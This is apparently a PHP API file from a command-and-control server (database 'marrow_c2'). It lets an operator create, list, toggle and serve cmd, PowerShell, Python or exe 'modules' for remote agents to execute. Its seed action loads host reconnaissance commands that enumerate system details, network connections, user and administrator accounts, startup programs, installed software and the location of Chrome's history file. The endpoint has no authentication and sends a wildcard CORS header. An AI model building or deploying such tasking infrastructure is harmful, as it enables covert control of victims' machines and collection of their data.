<?php
/**
 * Module API - Handles custom module CRUD and delivery to agents
 * Works with localhost MySQL (marrow_c2 database)
 */
require_once __DIR__ . '/../config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? $_POST['action'] ?? '';

try {
    switch ($action) {
        case 'get':
            // Agent requests module content for execution
            $id = intval($_GET['id'] ?? 0);
            if (!$id) {
                echo json_encode(['error' => 'Invalid module ID']);
                exit;
            }

            $stmt = $pdo->prepare("SELECT type, content FROM custom_modules WHERE id = ? AND is_active = 1");
            $stmt->execute([$id]);
            $module = $stmt->fetch();

            if (!$module) {
                echo json_encode(['error' => 'Module not found or inactive']);
                exit;
            }

            echo json_encode([
                'type' => $module['type'],
                'content' => $module['content']
            ]);
            break;

        case 'list':
            // Web UI requests list of all modules
            $stmt = $pdo->query("SELECT id, name, description, type, is_active, created_at FROM custom_modules ORDER BY id DESC");
            $modules = $stmt->fetchAll();
            echo json_encode(['success' => true, 'modules' => $modules]);
            break;

        case 'create':
            // Create new module
            $name = trim($_POST['name'] ?? '');
            $description = trim($_POST['description'] ?? '');
            $type = $_POST['type'] ?? 'cmd';
            $content = $_POST['content'] ?? '';

            if (!$name) {
                echo json_encode(['error' => 'Module name is required']);
                exit;
            }
            if (!$content) {
                echo json_encode(['error' => 'Module content/code is required']);
                exit;
            }

            // Validate type
            $validTypes = ['cmd', 'powershell', 'python', 'exe'];
            if (!in_array($type, $validTypes)) {
                $type = 'cmd';
            }

            $stmt = $pdo->prepare("INSERT INTO custom_modules (name, description, type, content, is_active) VALUES (?, ?, ?, ?, 1)");
            $stmt->execute([$name, $description, $type, $content]);

            echo json_encode(['success' => true, 'id' => $pdo->lastInsertId(), 'message' => 'Module created']);
            break;

        case 'update':
            // Update existing module
            $id = intval($_POST['id'] ?? 0);
            $name = trim($_POST['name'] ?? '');
            $description = trim($_POST['description'] ?? '');
            $type = $_POST['type'] ?? 'cmd';
            $content = $_POST['content'] ?? '';

            if (!$id) {
                echo json_encode(['error' => 'Invalid module ID']);
                exit;
            }

            $stmt = $pdo->prepare("UPDATE custom_modules SET name = ?, description = ?, type = ?, content = ? WHERE id = ?");
            $stmt->execute([$name, $description, $type, $content, $id]);

            echo json_encode(['success' => true, 'message' => 'Module updated']);
            break;

        case 'delete':
            // Delete module
            $id = intval($_POST['id'] ?? $_GET['id'] ?? 0);
            if (!$id) {
                echo json_encode(['error' => 'Invalid module ID']);
                exit;
            }

            $stmt = $pdo->prepare("DELETE FROM custom_modules WHERE id = ?");
            $stmt->execute([$id]);

            echo json_encode(['success' => true, 'message' => 'Module deleted']);
            break;

        case 'toggle':
            // Toggle module active status
            $id = intval($_POST['id'] ?? $_GET['id'] ?? 0);
            if (!$id) {
                echo json_encode(['error' => 'Invalid module ID']);
                exit;
            }

            $stmt = $pdo->prepare("UPDATE custom_modules SET is_active = NOT is_active WHERE id = ?");
            $stmt->execute([$id]);

            echo json_encode(['success' => true, 'message' => 'Module toggled']);
            break;

        case 'seed':
            // Add example modules (run once)
            $examples = [
                [
                    'name' => 'System Info',
                    'description' => 'Get detailed system information',
                    'type' => 'cmd',
                    'content' => 'systeminfo && echo. && wmic cpu get name && echo. && wmic memorychip get capacity'
                ],
                [
                    'name' => 'Network Connections',
                    'description' => 'List all active network connections',
                    'type' => 'cmd',
                    'content' => 'netstat -ano | findstr ESTABLISHED'
                ],
                [
                    'name' => 'User Accounts',
                    'description' => 'List all local user accounts',
                    'type' => 'cmd',
                    'content' => 'net user && echo. && net localgroup administrators'
                ],
                [
                    'name' => 'Startup Programs',
                    'description' => 'List programs that run at startup',
                    'type' => 'cmd',
                    'content' => 'wmic startup get caption,command,location'
                ],
                [
                    'name' => 'Installed Software',
                    'description' => 'List all installed programs via registry',
                    'type' => 'cmd',
                    'content' => 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr "DisplayName"'
                ],
                [
                    'name' => 'Browser History (Chrome)',
                    'description' => 'Get Chrome browser history file location',
                    'type' => 'powershell',
                    'content' => '$histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"; if(Test-Path $histPath) { "Chrome history exists at: $histPath" } else { "Chrome not found" }'
                ]
            ];

            $inserted = 0;
            foreach ($examples as $ex) {
                // Check if already exists
                $check = $pdo->prepare("SELECT id FROM custom_modules WHERE name = ?");
                $check->execute([$ex['name']]);
                if (!$check->fetch()) {
                    $stmt = $pdo->prepare("INSERT INTO custom_modules (name, description, type, content, is_active) VALUES (?, ?, ?, ?, 1)");
                    $stmt->execute([$ex['name'], $ex['description'], $ex['type'], $ex['content']]);
                    $inserted++;
                }
            }

            echo json_encode(['success' => true, 'message' => "$inserted example modules added"]);
            break;

        default:
            echo json_encode(['error' => 'Unknown action. Valid: list, get, create, update, delete, toggle, seed']);
    }
} catch (PDOException $e) {
    echo json_encode(['error' => 'Database error: ' . $e->getMessage()]);
}
?>